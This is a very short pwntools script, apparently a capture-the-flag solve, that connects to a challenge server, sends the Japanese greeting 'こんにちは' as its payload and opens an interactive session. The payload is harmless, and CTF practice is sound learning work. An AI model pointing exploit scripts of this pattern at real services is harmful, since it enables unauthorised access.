from pwn import *

io = remote("chall.pwnoh.io", "13370")
payload = 'こんにちは'
io.sendline(payload)
io.interactive()
